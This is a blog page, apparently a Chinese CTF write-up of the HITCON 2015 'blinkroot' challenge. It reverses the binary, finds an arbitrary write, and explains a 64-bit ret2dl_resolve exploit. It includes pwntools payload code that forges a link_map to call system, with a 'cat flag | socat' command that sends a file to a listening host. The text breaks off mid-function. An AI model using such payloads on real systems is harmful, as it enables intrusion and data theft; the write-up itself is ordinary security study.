@@ -1,0 +1,828 @@
+<!DOCTYPE html>
+<html lang="zh-cn">
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+  <title>blinkroot writeup - B1TG</title>
+  <meta name="renderer" content="webkit" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+<meta name="theme-color" content="#f8f5ec" />
+<meta name="msapplication-navbutton-color" content="#f8f5ec">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="apple-mobile-web-app-status-bar-style" content="#f8f5ec">
+
+
+<meta name="author" content="b1tg" /><meta name="description" content="hitcon2015 blinkroot writeup" /><meta name="keywords" content="Hugo, b1tg, even" />
+
+
+
+
+
+
+<meta name="generator" content="Hugo 0.73.0 with theme even" />
+
+
+<link rel="canonical" href="https://b1tg.github.io/post/blinkroot-writeup/" />
+<link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+<link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+<link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+<link rel="manifest" href="/manifest.json">
+<link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+
+
+<link href="/dist/even.c2a46f00.min.css" rel="stylesheet">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
+
+<meta property="og:title" content="blinkroot writeup" />
+<meta property="og:description" content="hitcon2015 blinkroot writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://b1tg.github.io/post/blinkroot-writeup/" />
+<meta property="article:published_time" content="2019-11-21T00:23:09+08:00" />
+<meta property="article:modified_time" content="2019-11-21T00:23:09+08:00" />
+<meta itemprop="name" content="blinkroot writeup">
+<meta itemprop="description" content="hitcon2015 blinkroot writeup">
+<meta itemprop="datePublished" content="2019-11-21T00:23:09&#43;08:00" />
+<meta itemprop="dateModified" content="2019-11-21T00:23:09&#43;08:00" />
+<meta itemprop="wordCount" content="2144">
+
+
+
+<meta itemprop="keywords" content="ctf," /><meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="blinkroot writeup"/>
+<meta name="twitter:description" content="hitcon2015 blinkroot writeup"/>
+
+<!--[if lte IE 9]>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/classlist/1.1.20170427/classList.min.js"></script>
+<![endif]-->
+
+<!--[if lt IE 9]>
+  <script src="https://cdn.jsdelivr.net/npm/html5shiv@3.7.3/dist/html5shiv.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/respond.js@1.4.2/dest/respond.min.js"></script>
+<![endif]-->
+
+</head>
+<body>
+  <div id="mobile-navbar" class="mobile-navbar">
+  <div class="mobile-header-logo">
+    <a href="/" class="logo">B1TG</a>
+  </div>
+  <div class="mobile-navbar-icon">
+    <span></span>
+    <span></span>
+    <span></span>
+  </div>
+</div>
+<nav id="mobile-menu" class="mobile-menu slideout-menu">
+  <ul class="mobile-menu-list">
+    <a href="/">
+        <li class="mobile-menu-item">Home</li>
+      </a><a href="/post/">
+        <li class="mobile-menu-item">Archives</li>
+      </a><a href="/tags/">
+        <li class="mobile-menu-item">Tags</li>
+      </a><a href="/about">
+        <li class="mobile-menu-item">About</li>
+      </a>
+  </ul>
+</nav>
+  <div class="container" id="mobile-panel">
+    <header id="header" class="header">
+        <div class="logo-wrapper">
+  <a href="/" class="logo">B1TG</a>
+</div>
+
+<nav class="site-navbar">
+  <ul id="menu" class="menu">
+    <li class="menu-item">
+        <a class="menu-item-link" href="/">Home</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/post/">Archives</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/tags/">Tags</a>
+      </li><li class="menu-item">
+        <a class="menu-item-link" href="/about">About</a>
+      </li>
+  </ul>
+</nav>
+    </header>
+
+    <main id="main" class="main">
+      <div class="content-wrapper">
+        <div id="content" class="content">
+          <article class="post">
+    
+    <header class="post-header">
+      <h1 class="post-title">blinkroot writeup</h1>
+
+      <div class="post-meta">
+        <span class="post-time"> 2019-11-21 </span>
+        
+        
+      </div>
+    </header>
+
+    <div class="post-toc" id="post-toc">
+  <h2 class="post-toc-title">文章目录</h2>
+  <div class="post-toc-content always-active">
+    <nav id="TableOfContents"></nav>
+  </div>
+</div>
+    <div class="post-content">
+      <h1 id="概要">概要</h1>
+<p>这题是在ray-cp的文章<a href="https://ray-cp.github.io/archivers/ret2dl_resolve_analysis">ret2dl_resolve_analysis</a>里面看到的，被用作讲解64位下ret2dl_resolve攻击的例子。由于汇编代码里面有对xmm0寄存器的操作，做的事情也很奇怪，我搞了半天才弄明白程序的逻辑。这篇就把程序的逻辑和payload的布局梳理一下，其中伪造link_map结构体的部分看ray-cp的原文就好，不能比他说的更好了。</p>
+<h1 id="逆向与分析">逆向与分析</h1>
+<p>基本信息：64位、保护开了nx和canary、符号没去</p>
+<p><img src="/img/blinkroot-writeup/image-20191120210823264.png" alt="image-20191120210823264"></p>
+<p>按照习惯拖到里面ida中看看</p>
+<p><img src="/img/blinkroot-writeup/image-20191120211018104.png" alt="image-20191120211018104"></p>
+<p>recvlen函数读取输入并返回读取的字节数</p>
+<p><img src="/img/blinkroot-writeup/image-20191120211637747.png" alt="image-20191120211637747"></p>
+<p>如果输入字符数不等于1024程序退出。正好等于1024的话标准输入、输出、错误被关闭。之后几行看ida反编译的代码没看懂，直接看看汇编吧。</p>
+<p>代码很短，注意这里的xmm0是128位寄存器。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-asm" data-lang="asm"><span class="nf">pwndbg</span><span class="err">&gt;</span> <span class="no">disassemble</span> <span class="no">main</span>
+<span class="nf">Dump</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">code</span> <span class="no">for</span> <span class="no">function</span> <span class="no">main</span><span class="p">:</span>
+   <span class="err">0</span><span class="nf">x0000000000400550</span> <span class="err">&lt;+</span><span class="mi">0</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">sub</span>    <span class="no">rsp</span><span class="p">,</span><span class="mi">0x18</span>
+   <span class="err">0</span><span class="nf">x0000000000400554</span> <span class="err">&lt;+</span><span class="mi">4</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">xor</span>    <span class="no">edi</span><span class="p">,</span><span class="no">edi</span>
+   <span class="err">0</span><span class="nf">x0000000000400556</span> <span class="err">&lt;+</span><span class="mi">6</span><span class="err">&gt;</span><span class="p">:</span>     <span class="no">mov</span>    <span class="no">edx</span><span class="p">,</span><span class="mi">0x400</span>
+   <span class="err">0</span><span class="nf">x000000000040055b</span> <span class="err">&lt;+</span><span class="mi">11</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x600bc0</span>
+   <span class="err">0</span><span class="nf">x0000000000400560</span> <span class="err">&lt;+</span><span class="mi">16</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="no">fs</span><span class="p">:</span><span class="mi">0x28</span>
+   <span class="err">0</span><span class="nf">x0000000000400569</span> <span class="err">&lt;+</span><span class="mi">25</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">0x8</span><span class="p">],</span><span class="no">rax</span>
+   <span class="err">0</span><span class="nf">x000000000040056e</span> <span class="err">&lt;+</span><span class="mi">30</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">eax</span><span class="p">,</span><span class="no">eax</span>
+   <span class="err">0</span><span class="nf">x0000000000400570</span> <span class="err">&lt;+</span><span class="mi">32</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4006d0</span> <span class="p">&lt;</span><span class="no">recvlen</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400575</span> <span class="err">&lt;+</span><span class="mi">37</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">xor</span>    <span class="no">edi</span><span class="p">,</span><span class="no">edi</span>
+   <span class="err">0</span><span class="nf">x0000000000400577</span> <span class="err">&lt;+</span><span class="mi">39</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">cmp</span>    <span class="no">rax</span><span class="p">,</span><span class="mi">0x400</span>
+   <span class="err">0</span><span class="nf">x000000000040057d</span> <span class="err">&lt;+</span><span class="mi">45</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">je</span>     <span class="mh">0x400584</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">52</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x000000000040057f</span> <span class="err">&lt;+</span><span class="mi">47</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x4004e0</span> <span class="p">&lt;</span><span class="no">_exit@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400584</span> <span class="err">&lt;+</span><span class="mi">52</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400510</span> <span class="p">&lt;</span><span class="no">close@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400589</span> <span class="err">&lt;+</span><span class="mi">57</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x1</span>
+   <span class="err">0</span><span class="nf">x000000000040058e</span> <span class="err">&lt;+</span><span class="mi">62</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400510</span> <span class="p">&lt;</span><span class="no">close@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x0000000000400593</span> <span class="err">&lt;+</span><span class="mi">67</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x2</span>
+   <span class="err">0</span><span class="nf">x0000000000400598</span> <span class="err">&lt;+</span><span class="mi">72</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">call</span>   <span class="mh">0x400510</span> <span class="p">&lt;</span><span class="no">close@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x000000000040059d</span> <span class="err">&lt;+</span><span class="mi">77</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">rax</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rip</span><span class="err">+</span><span class="mi">0x20061c</span><span class="p">]</span>  <span class="c"># 0x600bc0 &lt;data&gt;
+</span><span class="c"></span>   <span class="c"># rax = *(QWORD*)data data的[0-7]bytes
+</span><span class="c"></span>   <span class="mi">0x00000000004005a4</span> <span class="err">&lt;+</span><span class="mi">84</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="mi">0x10</span> <span class="c"># 把栈顶赋值为0x10
+</span><span class="c"></span>   <span class="mi">0x00000000004005ac</span> <span class="err">&lt;+</span><span class="mi">92</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">mov</span>    <span class="no">esi</span><span class="p">,</span><span class="mi">0x600bc8</span> <span class="c"># esi = &amp;data+8
+</span><span class="c"></span>   <span class="mi">0x00000000004005b1</span> <span class="err">&lt;+</span><span class="mi">97</span><span class="err">&gt;</span><span class="p">:</span>    <span class="no">lea</span>    <span class="no">rdx</span><span class="p">,[</span><span class="no">rax</span><span class="err">+</span><span class="mi">0x600bc0</span><span class="p">]</span> <span class="c"># rdx = rax+0x600bc0 target
+</span><span class="c"></span>   <span class="c"># xmm0是128位寄存器
+</span><span class="c"></span>   <span class="mi">0x00000000004005b8</span> <span class="err">&lt;+</span><span class="mi">104</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">movlps</span> <span class="no">xmm0</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsp</span><span class="p">]</span> <span class="c"># 移动到xmm0低64位; xmm0L = 0x10
+</span><span class="c"></span>   <span class="mi">0x00000000004005bc</span> <span class="err">&lt;+</span><span class="mi">108</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">movhps</span> <span class="no">xmm0</span><span class="p">,</span><span class="no">QWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rsi</span><span class="p">]</span> 
+   <span class="c"># 移动到xmm0高64位; xmm0H = *(QWORD*)(&amp;data+8) = data[8-15]
+</span><span class="c"></span>   <span class="mi">0x00000000004005bf</span> <span class="err">&lt;+</span><span class="mi">111</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">movaps</span> <span class="no">XMMWORD</span> <span class="no">PTR</span> <span class="p">[</span><span class="no">rdx</span><span class="p">],</span><span class="no">xmm0</span> <span class="c">#往target里面写入xmm0(128位)
+</span><span class="c"></span>   <span class="mi">0x00000000004005c2</span> <span class="err">&lt;+</span><span class="mi">114</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">mov</span>    <span class="no">edi</span><span class="p">,</span><span class="mi">0x600bd0</span> <span class="c"># edi = &amp;data+0x10
+</span><span class="c"></span>   <span class="mi">0x00000000004005c7</span> <span class="err">&lt;+</span><span class="mi">119</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">call</span>   <span class="mh">0x4004f0</span> <span class="p">&lt;</span><span class="no">puts@plt</span><span class="p">&gt;</span>
+   <span class="err">0</span><span class="nf">x00000000004005cc</span> <span class="err">&lt;+</span><span class="mi">124</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">xor</span>    <span class="no">edi</span><span class="p">,</span><span class="no">edi</span>
+   <span class="err">0</span><span class="nf">x00000000004005ce</span> <span class="err">&lt;+</span><span class="mi">126</span><span class="err">&gt;</span><span class="p">:</span>   <span class="no">jmp</span>    <span class="mh">0x40057f</span> <span class="p">&lt;</span><span class="no">main</span><span class="p">+</span><span class="mi">47</span><span class="p">&gt;</span>
+<span class="nf">End</span> <span class="no">of</span> <span class="no">assembler</span> <span class="no">dump.</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>翻译一下伪代码大概是这样的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">recvlen</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+        <span class="n">rax</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">int64_t</span> <span class="o">*</span><span class="p">)</span><span class="n">data</span><span class="p">;</span>
+        <span class="n">target</span> <span class="o">=</span> <span class="n">rax</span><span class="o">+&amp;</span><span class="n">data</span><span class="p">;</span>
+        <span class="n">xmm0</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">int64_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">data</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">64</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="o">*</span><span class="p">(</span><span class="n">int128_t</span> <span class="o">*</span><span class="p">)(</span><span class="n">target</span><span class="p">)</span> <span class="o">=</span> <span class="n">xmm0</span><span class="p">;</span> <span class="c1">//128位赋值
+</span><span class="c1"></span>        <span class="n">puts</span><span class="p">(</span><span class="o">&amp;</span><span class="n">data</span><span class="o">+</span><span class="mh">0x10</span><span class="p">);</span>         
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>再整理一下也就是：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-c" data-lang="c"><span class="kt">char</span> <span class="n">data</span><span class="p">[</span><span class="mi">1024</span><span class="p">];</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">recvlen</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">data</span><span class="p">,</span> <span class="mi">1024</span><span class="p">)</span> <span class="o">==</span> <span class="mi">1024</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">close</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+        <span class="n">close</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
+        <span class="n">int64_t</span> <span class="n">offset</span> <span class="o">=</span> <span class="p">(</span><span class="n">int64_t</span><span class="p">)</span><span class="n">data</span>
+        <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x10</span><span class="p">;</span>
+        <span class="n">data</span><span class="p">[</span><span class="n">offset</span><span class="o">+</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="p">(</span><span class="n">int64_t</span><span class="p">)(</span><span class="n">data</span><span class="o">+</span><span class="mi">8</span><span class="p">);</span>
+        <span class="n">puts</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="mi">16</span><span class="p">]);</span>
+    <span class="p">}</span>
+    <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>可以看出，这里有任意地址写的漏洞。构造data结构如下，由于offset是可控的，所以我们能往data+offset处写入：</p>
+<p><img src="/img/blinkroot-writeup/image-20191120232756098.png" alt="image-20191120232756098"></p>
+<h1 id="调试writeup">调试writeup</h1>
+<p>writeup中的payload如下：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="n">addr</span><span class="o">=</span><span class="mh">0x600BC0</span> <span class="c1"># data地址</span>
+<span class="n">plt0</span><span class="o">=</span><span class="mh">0x600B40</span> 
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x10000000000000000</span><span class="o">-</span><span class="p">(</span><span class="n">addr</span><span class="o">-</span><span class="n">plt0</span><span class="p">))</span> <span class="c1"># offset</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span> <span class="c1"># payload</span>
+<span class="n">payload</span><span class="o">+=</span><span class="s2">&#34;cat flag | socat - TCP4:127.0.0.1:1234;</span><span class="se">\x00</span><span class="s2">&#34;</span> <span class="c1"># arg</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x100</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<span class="n">offset</span><span class="o">=</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">got_libc_address</span><span class="o">=</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;__libc_start_main&#39;</span><span class="p">]</span>
+<span class="n">fake_link_map</span><span class="o">=</span><span class="n">build_link_map</span><span class="p">(</span><span class="n">addr</span><span class="o">+</span><span class="mh">0x100</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">got_libc_address</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">fake_link_map</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x400</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>写入payload之后的内存状况：</p>
+<p><img src="/img/blinkroot-writeup/image-20191120222924223.png" alt="image-20191120222924223"></p>
+<p>可以看到payload希望在0x600b40处写入0x10，在0x600b48处写入0x600cc0，在0x600bd0处写参数。</p>
+<p>0x600cc0在data范围内，payload在这里构造了某种数据结构。</p>
+<p>target = data+offset，所以offset=target-data，由于要写入的地址小于data的地址，所以offset要加上<em>0x10000000000000000</em>否则p64会报错。</p>
+<p>接下来问题就是为什么要在0x600b48处写，以及0x600cc0处的结构体是什么？</p>
+<p>这题用的攻击叫做ret2dl_resolve，通过伪造关键数据结构改变解析函数地址时的逻辑。</p>
+<p>可以看出0x600b48处的值会被当做函数_dl_fixup的第一个参数，这里是0x600cc0。</p>
+<p><img src="/img/blinkroot-writeup/image-20191120225834994.png" alt="image-20191120225834994"></p>
+<p><img src="/img/blinkroot-writeup/image-20191120230133527.png" alt="image-20191120230133527"></p>
+<p>_dl_fixup的函数定义是这样的：</p>
+<p><img src="/img/blinkroot-writeup/image-20191120230556653.png" alt="image-20191120230556653"></p>
+<p>所以0x600cc0处构造的是一个link_map类型的结构体，结构体内容很多，有两百多行，这里就不方便贴出来了。可以到<a href="https://code.woboq.org/userspace/glibc/include/link.h.html#link_map">这里</a>在线浏览。</p>
+<p>writeup中伪造link_map结构体的函数，伪造的原理看下面的<a href="#%E5%8F%82%E8%80%83">参考1</a>吧。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-python" data-lang="python"><span class="c1"># 我们的调用参数: fake_link_map=build_link_map(0x600cc0, 1, offset, got_libc_address)</span>
+<span class="c1"># offset=libc.symbols[&#39;system&#39;]-libc.symbols[&#39;__libc_start_main&#39;]</span>
+<span class="c1"># got_libc_address=got_libc_address=elf.got[&#39;__libc_start_main&#39;]</span>
+
+<span class="k">def</span> <span class="nf">build_link_map</span><span class="p">(</span><span class="n">fake_addr</span><span class="p">,</span><span class="n">reloc_index</span><span class="p">,</span><span class="n">offset</span><span class="p">,</span><span class="n">got_libc_address</span><span class="p">):</span>
+<span class="c1"># 来自https://github.com/ray-cp/pwn_debug/blob/master/pwn_debug/ret2dl_resolve.py</span>
+    <span class="s1">&#39;&#39;&#39;
+</span><span class="s1">    linkmap:
+</span><span class="s1">    0x00: START
+</span><span class="s1">    0x00: l_addr (offset from libc_address to target address
+</span><span class="s1">    0x08: 
+</span><span class="s1">    0x10: 
+</span><span class="s1">    0x14:
+</span><span class="s1">    0x15:
+</span><span class="s1">    0x18:
+</span><span class="s1">    0x20:
+</span><span class="s1">    0x28: # target address here
+</span><span class="s1">    0x30: fake_jmprel #r_offset 
+</span><span class="s1">    0x38:             #r_info should be 7
+</span><span class="s1">    0x40:             #r_addend 0
+</span><span class="s1">    0x48: 
+</span><span class="s1">    0x68: P_DT_STRTAB = linkmap_addr(just a pointer)
+</span><span class="s1">    0x70: p_DT_SYMTAB = fake_DT_SYMTAB
+</span><span class="s1">    0xf8: p_DT_JMPREL = fake_DT_JMPREL
+</span><span class="s1">    0x100: END
+</span><span class="s1">    typedef struct
+</span><span class="s1">    {
+</span><span class="s1">        Elf64_Word    st_name;        /* Symbol name (string tbl index) */
+</span><span class="s1">        unsigned char    st_info;        /* Symbol type and binding */
+</span><span class="s1">        unsigned char st_other;        /* Symbol visibility */
+</span><span class="s1">        Elf64_Section    st_shndx;        /* Section index */
+</span><span class="s1">        Elf64_Addr    st_value;        /* Symbol value */
+</span><span class="s1">        Elf64_Xword    st_size;        /* Symbol size */
+</span><span class="s1">    } Elf64_Sym;
+</span><span class="s1">    typedef struct
+</span><span class="s1">    {
+</span><span class="s1">        Elf64_Addr    r_offset;        /* Address */
+</span><span class="s1">        Elf64_Xword    r_info;            /* Relocation type and symbol index */
+</span><span class="s1">        Elf64_Sxword    r_addend;        /* Addend */
+</span><span class="s1">    } Elf64_Rela;
+</span><span class="s1">    &#39;&#39;&#39;</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="n">offset</span><span class="p">)</span>
+    <span class="n">fake_link_map</span><span class="o">=</span><span class="n">fake_link_map</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+
+    <span class="c1">#fake_sym=p32(0)  #st_name whatever</span>
